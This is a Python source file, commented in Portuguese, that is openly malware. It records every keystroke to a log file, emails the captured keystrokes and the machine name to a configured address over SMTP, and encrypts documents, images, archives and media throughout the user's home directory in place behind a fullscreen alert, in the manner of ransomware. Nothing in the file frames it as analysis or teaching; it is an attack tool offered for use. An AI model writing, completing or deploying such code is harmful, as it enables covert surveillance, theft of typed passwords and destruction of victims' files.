import os
import smtplib
import platform
from pynput.keyboard import Listener
from cryptography.fernet import Fernet
import ctypes
from tkinter import *
from PIL import ImageTk, Image

# Configurações de e-mail
SMTP_SERVER = 'smtp.mail.com'
SMTP_PORT = 587
SENDER_EMAIL = 'seu_email@mail.com'
SENDER_PASSWORD = 'sua_senha'
RECEIVER_EMAIL = 'destinatario@mail.com'

# Chave de criptografia
KEY = b'coloque_sua_chave_aqui'

# Lista de extensões criptografadas
ENCRYPT_EXTENSIONS = [
    '.txt', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf',
    '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tif', '.tiff', '.raw',
    '.zip', '.rar', '.7z', '.tar', '.gz', '.tgz', '.bz2', '.xz',
    '.mp3', '.wav', '.flac', '.aac', '.wma', '.ogg', '.m4a',
    '.mp4', '.mov', '.avi', '.mkv', '.wmv', '.flv', '.3gp',
]

# Diretório para salvar os arquivos capturados
OUTPUT_DIR = 'logs'


def on_press(key):
    with open(os.path.join(OUTPUT_DIR, 'logs.txt'), 'a') as f:
        f.write(f'{key} ')


def send_logs():
    with open(os.path.join(OUTPUT_DIR, 'logs.txt'), 'r') as f:
        logs = f.read()

    subject = f'Logs - {platform.node()}'
    body = f'Logs capturados do computador {platform.node()}:\n\n{logs}'

    message = f'Subject: {subject}\n\n{body}'

    try:
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(SENDER_EMAIL, SENDER_PASSWORD)
        server.sendmail(SENDER_EMAIL, RECEIVER_EMAIL, message)
        server.quit()
    except Exception as e:
        print(f'Erro ao enviar e-mail: {str(e)}')


def encrypt_files():
    fernet = Fernet(KEY)

    for root, dirs, files in os.walk(os.path.expanduser('~')):
        for file in files:
            file_ext = os.path.splitext(file)[1].lower()
            if file_ext in ENCRYPT_EXTENSIONS:
                file_path = os.path.join(root, file)
                with open(file_path, 'rb') as f:
                    data = f.read()
                encrypted_data = fernet.encrypt(data)
                with open(file_path, 'wb') as f:
                    f.write(encrypted_data)

    # Exibe uma mensagem de alerta após a criptografia
    ctypes.windll.user32.MessageBoxW(0, "Todos os dados foram criptografados com sucesso.", "Alerta", 1)


def display_alert():
    root = Tk()
    root.title("Alerta")
    root.attributes('-fullscreen', True)

    # Carrega a imagem de alerta
    image = Image.open("alert.png")
    image = image.resize((root.winfo_screenwidth(), root.winfo_screenheight()), Image.ANTIALIAS)
    img = ImageTk.PhotoImage(image)

    # Exibe a imagem na tela
    panel = Label(root, image=img)
    panel.pack(side="top", fill="both", expand="yes")

    # Executa a função de criptografia ao pressionar qualquer tecla
    def on_key_press(event):
        encrypt_files()
        root.destroy()

    # Associa a função on_key_press ao evento de pressionar qualquer tecla
    root.bind("<Key>", on_key_press)

    root.mainloop()


def main():
    # Cria o diretório para salvar os arquivos capturados
    os.makedirs(OUTPUT_DIR, exist_ok=True)

    # Inicia a captura das teclas digitadas
    with Listener(on_press=on_press) as listener:
        listener.join()

    # Envia os logs capturados por e-mail
    send_logs()

    # Exibe a tela de alerta e executa a função de criptografia
    display_alert()


if __name__ == '__main__':
    main()
